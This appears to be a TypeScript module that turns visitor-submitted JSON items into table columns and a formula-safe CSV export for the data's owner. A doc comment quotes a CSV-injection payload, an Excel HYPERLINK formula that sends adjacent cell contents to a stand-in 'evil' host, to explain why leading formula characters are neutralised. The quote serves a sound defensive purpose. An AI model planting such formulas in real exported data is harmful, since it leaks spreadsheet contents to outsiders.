import type { CollectionItem } from "./data.js";

/**
 * Tabular projection of collected items (app-data design §3.2/§5).
 *
 * A collection item is opaque, size-capped, app-supplied JSON — deliberately
 * unvalidated, because owner-declared item schemas are deferred (§9). To show the
 * owner a table we therefore *derive* columns from the data itself, which makes
 * these rules load-bearing in a way ordinary formatting code is not: `item` is
 * written by anonymous visitors, so **the column set is attacker-influenced**.
 * Hence the frequency ordering (one junk row with 60 keys must not evict `email`),
 * the strict scalar rule, the hard cap, and the `item.` namespace.
 *
 * Shared by the portal's CSV export and the SPA's table so there is one spec and
 * one test suite. It does **not** make their output identical: the SPA derives
 * from the rows on screen and the export from up to 10,000, so the two column
 * sets can legitimately differ.
 */

/** Derived columns are capped; the raw `item` column always carries the rest. */
export const MAX_DERIVED_COLUMNS = 12;

/** Constructed, not written literally — an invisible character is too easy to lose. */
export const BOM = String.fromCharCode(0xfeff);

export type CollectionCell = string | number | boolean | null;

export interface CollectionColumns {
  /** Bare app keys, frequency-ordered. Presented as `item.<key>`. */
  keys: string[];
  /** True when eligible keys were dropped by the cap. */
  truncated: boolean;
}

/** The `item.` namespace keeps app keys from ever colliding with platform ones. */
export function columnHeader(key: string): string {
  return `item.${key}`;
}

function isPlainObject(v: unknown): v is Record<string, unknown> {
  // `typeof null === "object"` — the classic trap this guard exists for.
  return v !== null && typeof v === "object" && !Array.isArray(v);
}

function isScalar(v: unknown): v is CollectionCell {
  return v === null || typeof v === "string" || typeof v === "number" || typeof v === "boolean";
}

/**
 * Choose columns from the top-level scalar keys of `items`.
 *
 * A key qualifies only if **every** occurrence is scalar — a key that is
 * sometimes an object gets no column at all, rather than a column that silently
 * drops the object-valued rows.
 *
 * Ranking is by how many rows carry a *non-null* scalar for the key (descending),
 * so the columns are the ones most rows actually have. Ties break by **order of
 * first encounter**, which is already a total order (each key is encountered
 * exactly once), so the result is fully determined by the input.
 *
 * Note what that order is *not*: items are stored in a Postgres `jsonb` column,
 * which normalises key order (by length, then bytewise), so the app's original
 * authoring order is gone before these items are read back. Equal-frequency
 * columns therefore appear in jsonb's canonical order, not the order the form
 * posted them in. Deterministic, but not authored — don't promise otherwise.
 */
export function deriveCollectionColumns(
  items: readonly CollectionItem[],
  max: number = MAX_DERIVED_COLUMNS,
): CollectionColumns {
  interface Census {
    /** Rows carrying a non-null scalar — the ranking weight. */
    populated: number;
    /** Monotonic across the whole scan, so it discriminates keys within a row. */
    firstSeen: number;
    /** Set once any occurrence is a non-scalar; permanently disqualifying. */
    disqualified: boolean;
  }
  const census = new Map<string, Census>();
  let encountered = 0;

  for (const it of items) {
    // A non-object item (string, array, number, null) contributes no columns; its
    // value still reaches the owner through the raw `item` column.
    if (!isPlainObject(it.item)) continue;
    for (const [key, value] of Object.entries(it.item)) {
      if (value === undefined) continue; // absent, not present-and-empty
      let seen = census.get(key);
      if (!seen) {
        seen = { populated: 0, firstSeen: encountered++, disqualified: false };
        census.set(key, seen);
      }
      if (!isScalar(value)) seen.disqualified = true;
      else if (value !== null) seen.populated += 1;
    }
  }

  const eligible = [...census.entries()]
    .filter(([, c]) => !c.disqualified)
    .sort(([, a], [, b]) => b.populated - a.populated || a.firstSeen - b.firstSeen)
    .map(([key]) => key);

  return { keys: eligible.slice(0, max), truncated: eligible.length > max };
}

/**
 * One cell per derived column. Missing and explicitly-null both yield `null` —
 * the raw `item` column preserves the difference for anyone who needs it. Note
 * `false` and `0` come back as themselves, not as `null`.
 */
export function collectionRowCells(
  item: CollectionItem,
  cols: CollectionColumns,
): CollectionCell[] {
  const obj = isPlainObject(item.item) ? item.item : {};
  return cols.keys.map((key) => {
    const v = obj[key];
    return isScalar(v) ? v : null;
  });
}

/** Display form of a derived cell. Null (and missing) render empty. */
function renderCell(v: CollectionCell): string {
  return v === null ? "" : String(v);
}

/**
 * Neutralise a spreadsheet formula, then apply RFC-4180 quoting.
 *
 * Quoting alone does **not** protect a reader: Excel evaluates `=…` after
 * unquoting, so `{"name":"=HYPERLINK(\"https://evil/?x\"&A1,\"click\")"}` — a
 * value an anonymous visitor chose — would exfiltrate adjacent cells when the
 * owner opens the file. A leading apostrophe forces text.
 *
 * Values that are simply numeric are left alone: `-5` and `+3.2` are not
 * formulas, and mangling them into `'-5` would corrupt real data. Anything that
 * merely *starts* like a number but isn't one (`-1+1`) is still NaN, so it is
 * still neutralised.
 *
 * This mutates data, so it is confined to the CSV path — never the JSON export
 * and never the SPA.
 */
export function csvCell(rendered: string): string {
  const risky =
    /^[=+\-@\t\r]/.test(rendered) && !Number.isFinite(Number(rendered)) ? `'${rendered}` : rendered;
  return /[",\n\r]/.test(risky) ? `"${risky.replace(/"/g, '""')}"` : risky;
}

/**
 * The owner's CSV: platform columns, the derived app columns, then the raw
 * `item`/`meta` JSON as a lossless fallback for copy-paste and scripting.
 *
 * Leads with a UTF-8 BOM so Excel reads non-ASCII names (a contact list full of
 * mojibake is worse than the cost, which is that byte-oriented consumers should
 * decode as `utf-8-sig`).
 *
 * Rows are LF-separated, not RFC-4180's CRLF — every parser accepts LF, and the
 * RFC conformance claimed above is about *cell quoting*, which is what actually
 * decides whether a value survives a round trip. Recorded so the choice reads as
 * deliberate.
 */
export function collectionCsv(items: readonly CollectionItem[]): {
  csv: string;
  columns: CollectionColumns;
} {
  const columns = deriveCollectionColumns(items);
  const header = [
    "id",
    "createdAt",
    "env",
    "userOid",
    ...columns.keys.map(columnHeader),
    "item",
    "meta",
  ];
  const lines = items.map((it) =>
    [
      it.id,
      it.createdAt,
      it.env,
      it.userOid ?? "",
      ...collectionRowCells(it, columns).map(renderCell),
      JSON.stringify(it.item ?? null),
      JSON.stringify(it.meta ?? null),
    ]
      .map(csvCell)
      .join(","),
  );
  const body = [header.map(csvCell).join(","), ...lines].join("\n");
  return { csv: `${BOM}${body}`, columns };
}
